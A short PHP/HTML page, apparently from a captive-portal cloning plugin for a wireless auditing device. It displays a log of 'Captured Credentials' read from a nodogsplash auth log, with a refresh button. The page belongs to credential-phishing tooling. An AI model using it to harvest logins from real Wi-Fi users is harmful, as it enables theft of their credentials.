<?php
define('__ROOT__', dirname(dirname(__FILE__))); 
require_once(__ROOT__.'/functions.php');
global $rel_dir;
?>
<!DOCTYPE html>
<html>
<head>
<script>
$('#refreshAuthLog').on('click',function(){
	$.post("/components/infusions/portalauth/functions.php",{refreshAuthLog:""},function(data){
		$('#authlog').html(data);
	});
});
</script>
</head>
<body>
<div class="pa_cloner_container">

<h1 class="pa_h1 text_center">Captured Credentials</h1>

<table class="pa_inject_table">
<tr><td align="left" colspan="2">
</td></tr><tr><td align="left" colspan="2">
<textarea id="authlog" readonly><? echo file_get_contents('/www/nodogsplash/auth.log'); ?></textarea>
</td></tr>
<tr><td align="center">
<button class="pa_button" id="refreshAuthLog">Refresh Log</button>
</table>

</div>

</body>
</html>